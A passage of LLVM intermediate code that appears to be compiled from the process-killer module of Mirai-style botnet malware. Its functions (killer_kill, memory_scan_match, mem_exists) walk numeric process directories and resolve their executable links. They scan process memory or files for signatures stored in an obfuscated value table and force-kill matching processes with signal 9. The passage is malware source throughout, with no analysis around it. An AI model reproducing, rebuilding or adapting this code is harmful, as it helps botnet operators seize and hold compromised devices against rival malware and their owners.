  br label %235

235:                                              ; preds = %367, %280, %257, %234
  %236 = load %struct.__dirstream*, %struct.__dirstream** %4, align 8
  %237 = call %struct.dirent* @readdir(%struct.__dirstream* %236)
  store %struct.dirent* %237, %struct.dirent** %6, align 8
  %238 = icmp ne %struct.dirent* %237, null
  br i1 %238, label %239, label %242

239:                                              ; preds = %235
  %240 = load i32, i32* %15, align 4
  %241 = icmp eq i32 %240, 0
  br label %242

242:                                              ; preds = %239, %235
  %243 = phi i1 [ false, %235 ], [ %241, %239 ]
  br i1 %243, label %244, label %368

244:                                              ; preds = %242
  %245 = load %struct.dirent*, %struct.dirent** %6, align 8
  %246 = getelementptr inbounds %struct.dirent, %struct.dirent* %245, i32 0, i32 4
  %247 = getelementptr inbounds [256 x i8], [256 x i8]* %246, i64 0, i64 0
  store i8* %247, i8** %22, align 8
  %248 = load i8*, i8** %22, align 8
  %249 = load i8, i8* %248, align 1
  %250 = sext i8 %249 to i32
  %251 = icmp slt i32 %250, 48
  br i1 %251, label %257, label %252

252:                                              ; preds = %244
  %253 = load i8*, i8** %22, align 8
  %254 = load i8, i8* %253, align 1
  %255 = sext i8 %254 to i32
  %256 = icmp sgt i32 %255, 57
  br i1 %256, label %257, label %258

257:                                              ; preds = %252, %244
  br label %235, !llvm.loop !13

258:                                              ; preds = %252
  %259 = load i8*, i8** %14, align 8
  %260 = call i8* @table_retrieve_val(i32 13, i32* null)
  %261 = call i32 @util_strcpy(i8* %259, i8* %260)
  %262 = load i8*, i8** %14, align 8
  %263 = load i8*, i8** %14, align 8
  %264 = call i32 @util_strlen(i8* %263)
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds i8, i8* %262, i64 %265
  %267 = load i8*, i8** %22, align 8
  %268 = call i32 @util_strcpy(i8* %266, i8* %267)
  %269 = load i8*, i8** %14, align 8
  %270 = load i8*, i8** %14, align 8
  %271 = call i32 @util_strlen(i8* %270)
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds i8, i8* %269, i64 %272
  %274 = call i8* @table_retrieve_val(i32 14, i32* null)
  %275 = call i32 @util_strcpy(i8* %273, i8* %274)
  %276 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %277 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %278 = call i64 @readlink(i8* %276, i8* %277, i64 4096) #6
  %279 = icmp eq i64 %278, -1
  br i1 %279, label %280, label %281

280:                                              ; preds = %258
  br label %235, !llvm.loop !13

281:                                              ; preds = %258
  %282 = load i8*, i8** %14, align 8
  %283 = call i8* @table_retrieve_val(i32 13, i32* null)
  %284 = call i32 @util_strcpy(i8* %282, i8* %283)
  %285 = load i8*, i8** %14, align 8
  %286 = load i8*, i8** %14, align 8
  %287 = call i32 @util_strlen(i8* %286)
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds i8, i8* %285, i64 %288
  %290 = load i8*, i8** %22, align 8
  %291 = call i32 @util_strcpy(i8* %289, i8* %290)
  %292 = load i8*, i8** %14, align 8
  %293 = load i8*, i8** %14, align 8
  %294 = call i32 @util_strlen(i8* %293)
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds i8, i8* %292, i64 %295
  %297 = call i8* @table_retrieve_val(i32 15, i32* null)
  %298 = call i32 @util_strcpy(i8* %296, i8* %297)
  %299 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %300 = call %struct.__dirstream* @opendir(i8* %299)
  store %struct.__dirstream* %300, %struct.__dirstream** %5, align 8
  %301 = icmp ne %struct.__dirstream* %300, null
  br i1 %301, label %302, label %367

302:                                              ; preds = %281
  br label %303

303:                                              ; preds = %363, %351, %302
  %304 = load %struct.__dirstream*, %struct.__dirstream** %5, align 8
  %305 = call %struct.dirent* @readdir(%struct.__dirstream* %304)
  store %struct.dirent* %305, %struct.dirent** %7, align 8
  %306 = icmp ne %struct.dirent* %305, null
  br i1 %306, label %307, label %310

307:                                              ; preds = %303
  %308 = load i32, i32* %15, align 4
  %309 = icmp eq i32 %308, 0
  br label %310

310:                                              ; preds = %307, %303
  %311 = phi i1 [ false, %303 ], [ %309, %307 ]
  br i1 %311, label %312, label %364

312:                                              ; preds = %310
  %313 = load %struct.dirent*, %struct.dirent** %7, align 8
  %314 = getelementptr inbounds %struct.dirent, %struct.dirent* %313, i32 0, i32 4
  %315 = getelementptr inbounds [256 x i8], [256 x i8]* %314, i64 0, i64 0
  store i8* %315, i8** %23, align 8
  %316 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  call void @util_zero(i8* %316, i32 4096)
  %317 = load i8*, i8** %14, align 8
  %318 = call i8* @table_retrieve_val(i32 13, i32* null)
  %319 = call i32 @util_strcpy(i8* %317, i8* %318)
  %320 = load i8*, i8** %14, align 8
  %321 = load i8*, i8** %14, align 8
  %322 = call i32 @util_strlen(i8* %321)
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds i8, i8* %320, i64 %323
  %325 = load i8*, i8** %22, align 8
  %326 = call i32 @util_strcpy(i8* %324, i8* %325)
  %327 = load i8*, i8** %14, align 8
  %328 = load i8*, i8** %14, align 8
  %329 = call i32 @util_strlen(i8* %328)
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds i8, i8* %327, i64 %330
  %332 = call i8* @table_retrieve_val(i32 15, i32* null)
  %333 = call i32 @util_strcpy(i8* %331, i8* %332)
  %334 = load i8*, i8** %14, align 8
  %335 = load i8*, i8** %14, align 8
  %336 = call i32 @util_strlen(i8* %335)
  %337 = sext i32 %336 to i64
  %338 = getelementptr inbounds i8, i8* %334, i64 %337
  %339 = call i32 @util_strcpy(i8* %338, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  %340 = load i8*, i8** %14, align 8
  %341 = load i8*, i8** %14, align 8
  %342 = call i32 @util_strlen(i8* %341)
  %343 = sext i32 %342 to i64
  %344 = getelementptr inbounds i8, i8* %340, i64 %343
  %345 = load i8*, i8** %23, align 8
  %346 = call i32 @util_strcpy(i8* %344, i8* %345)
  %347 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %348 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %349 = call i64 @readlink(i8* %347, i8* %348, i64 4096) #6
  %350 = icmp eq i64 %349, -1
  br i1 %350, label %351, label %352

351:                                              ; preds = %312
  br label %303, !llvm.loop !14

352:                                              ; preds = %312
  %353 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %354 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %355 = call i32 @util_strlen(i8* %354)
  %356 = getelementptr inbounds [16 x i8], [16 x i8]* %13, i64 0, i64 0
  %357 = call i32 @util_stristr(i8* %353, i32 %355, i8* %356)
  %358 = icmp ne i32 %357, -1
  br i1 %358, label %359, label %363

359:                                              ; preds = %352
  %360 = load i8*, i8** %22, align 8
  %361 = call i32 @util_atoi(i8* %360, i32 10)
  %362 = call i32 @kill(i32 %361, i32 9) #6
  store i32 1, i32* %15, align 4
  br label %363

363:                                              ; preds = %359, %352
  br label %303, !llvm.loop !14

364:                                              ; preds = %310
  %365 = load %struct.__dirstream*, %struct.__dirstream** %5, align 8
  %366 = call i32 @closedir(%struct.__dirstream* %365)
  br label %367

367:                                              ; preds = %364, %281
  br label %235, !llvm.loop !13

368:                                              ; preds = %242
  %369 = load %struct.__dirstream*, %struct.__dirstream** %4, align 8
  %370 = call i32 @closedir(%struct.__dirstream* %369)
  br label %371

371:                                              ; preds = %368, %230
  %372 = call i32 @sleep(i32 1)
  call void @table_lock_val(i8 zeroext 13)
  call void @table_lock_val(i8 zeroext 14)
  call void @table_lock_val(i8 zeroext 15)
  %373 = load i32, i32* %15, align 4
  %374 = trunc i32 %373 to i8
  store i8 %374, i8* %2, align 1
  br label %375

375:                                              ; preds = %371, %229, %52
  %376 = load i8, i8* %2, align 1
  ret i8 %376
}

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #3

declare %struct.dirent* @readdir(%struct.__dirstream*) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #4

declare i32 @util_strcpy(i8*, i8*) #2

; Function Attrs: nounwind
declare i64 @readlink(i8*, i8*, i64) #1

declare i32 @util_stristr(i8*, i32, i8*) #2

; Function Attrs: nounwind
declare i32 @unlink(i8*) #1

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: nounwind
declare i32 @getpid() #1

; Function Attrs: nounwind
declare i32 @getppid() #1

declare signext i8 @util_strcmp(i8*, i8*) #2

declare i32 @open(i8*, i32, ...) #2

declare i32 @close(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal signext i8 @memory_scan_match(i8* %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca [4096 x i8], align 16
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i8 0, i8* %11, align 1
  %12 = load i8*, i8** %3, align 8
  %13 = call i32 (i8*, i32, ...) @open(i8* %12, i32 0)
  store i32 %13, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %1
  store i8 0, i8* %2, align 1
  br label %47

16:                                               ; preds = %1
  call void @table_unlock_val(i8 zeroext 18)
  call void @table_unlock_val(i8 zeroext 19)
  %17 = call i8* @table_retrieve_val(i32 18, i32* %9)
  store i8* %17, i8** %7, align 8
  %18 = call i8* @table_retrieve_val(i32 19, i32* %10)
  store i8* %18, i8** %8, align 8
  br label %19

19:                                               ; preds = %42, %16
  %20 = load i32, i32* %4, align 4
  %21 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %22 = call i64 @read(i32 %20, i8* %21, i64 4096)
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %5, align 4
  %24 = icmp sgt i32 %23, 0
  br i1 %24, label %25, label %43

25:                                               ; preds = %19
  %26 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %27 = load i32, i32* %5, align 4
  %28 = load i8*, i8** %7, align 8
  %29 = load i32, i32* %9, align 4
  %30 = call signext i8 @mem_exists(i8* %26, i32 %27, i8* %28, i32 %29)
  %31 = sext i8 %30 to i32
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %41, label %33

33:                                               ; preds = %25
  %34 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %35 = load i32, i32* %5, align 4
  %36 = load i8*, i8** %8, align 8
  %37 = load i32, i32* %10, align 4
  %38 = call signext i8 @mem_exists(i8* %34, i32 %35, i8* %36, i32 %37)
  %39 = sext i8 %38 to i32
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %42

41:                                               ; preds = %33, %25
  store i8 1, i8* %11, align 1
  br label %43

42:                                               ; preds = %33
  br label %19, !llvm.loop !15

43:                                               ; preds = %41, %19
  call void @table_lock_val(i8 zeroext 18)
  call void @table_lock_val(i8 zeroext 19)
  %44 = load i32, i32* %4, align 4
  %45 = call i32 @close(i32 %44)
  %46 = load i8, i8* %11, align 1
  store i8 %46, i8* %2, align 1
  br label %47

47:                                               ; preds = %43, %15
  %48 = load i8, i8* %2, align 1
  ret i8 %48
}

declare void @util_zero(i8*, i32) #2

declare i32 @closedir(%struct.__dirstream*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @killer_kill() #0 {
  %1 = load i32, i32* @killer_pid, align 4
  %2 = call i32 @kill(i32 %1, i32 9) #6
  ret void
}

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #5

declare i8* @util_itoa(i32, i32, i8*) #2

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @ntohs(i16 zeroext) #3

declare i32 @util_strlen(i8*) #2

declare i8* @util_fdgets(i8*, i32, i32) #2

declare i32 @util_atoi(i8*, i32) #2

declare i64 @read(i32, i8*, i64) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal signext i8 @mem_exists(i8* %0, i32 %1, i8* %2, i32 %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %10, align 4
  %11 = load i32, i32* %9, align 4
  %12 = load i32, i32* %7, align 4
  %13 = icmp sgt i32 %11, %12
  br i1 %13, label %14, label %15

14:                                               ; preds = %4
  store i8 0, i8* %5, align 1
  br label %42

15:                                               ; preds = %4
  br label %16

16:                                               ; preds = %40, %15
  %17 = load i32, i32* %7, align 4
  %18 = add nsw i32 %17, -1
  store i32 %18, i32* %7, align 4
  %19 = icmp ne i32 %17, 0
  br i1 %19, label %20, label %41

20:                                               ; preds = %16
  %21 = load i8*, i8** %6, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %6, align 8
  %23 = load i8, i8* %21, align 1
  %24 = sext i8 %23 to i32
  %25 = load i8*, i8** %8, align 8
  %26 = load i32, i32* %10, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i8, i8* %28, align 1
  %30 = sext i8 %29 to i32
  %31 = icmp eq i32 %24, %30
  br i1 %31, label %32, label %39

32:                                               ; preds = %20
  %33 = load i32, i32* %10, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %10, align 4
  %35 = load i32, i32* %9, align 4
  %36 = icmp eq i32 %34, %35
  br i1 %36, label %37, label %38

37:                                               ; preds = %32
  store i8 1, i8* %5, align 1
  br label %42

38:                                               ; preds = %32
  br label %40

39:                                               ; preds = %20
  store i32 0, i32* %10, align 4
  br label %40

40:                                               ; preds = %39, %38
  br label %16, !llvm.loop !16

41:                                               ; preds = %16
  store i8 0, i8* %5, align 1
  br label %42

42:                                               ; preds = %41, %37, %14
  %43 = load i8, i8* %5, align 1
  ret i8 %43
}

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { argmemonly nofree nounwind willreturn writeonly }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone willreturn }
attributes #8 = { nounwind readonly willreturn }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
